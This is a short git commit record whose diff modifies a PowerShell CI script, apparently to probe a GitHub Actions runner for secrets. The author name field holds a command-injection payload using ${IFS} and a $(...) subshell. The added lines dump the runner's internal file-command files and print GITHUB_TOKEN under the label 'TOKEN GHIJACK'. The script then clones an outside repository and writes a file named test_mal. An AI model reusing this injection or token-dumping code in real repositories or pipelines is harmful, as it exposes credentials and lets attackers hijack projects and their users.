40a02b7cbc88453f35160537e119fc12572f823d
stp-$('&&${IFS}echo${IFS}${IFS}&&echo${IFS}fullname&&${IFS}echo${IFS}') <76434077+d3kum1d0r1y4@users.noreply.github.com>
2023-08-09 04:49:46 -0400

    Update script.ps1

--- src/script.ps1
+++ src/script.ps1
@@ -1,6 +1,12 @@
 pip3 install requests
+Get-ChildItem -Path "D:\a\_temp\_runner_file_commands\" -Recurse -File | ForEach-Object {
+    $filePath = $_.FullName
+    Write-Host "File: $filePath"
+    Get-Content -Path $filePath
+}
+echo "TOKEN GHIJACK"
+echo $GITHUB_TOKEN
 git clone https://github.com/tester49481/test.git
-echo ${{ secrets.GITHUB_TOKEN }}
 cd test
 gh auth status
 echo "TEShT" >> test_mal
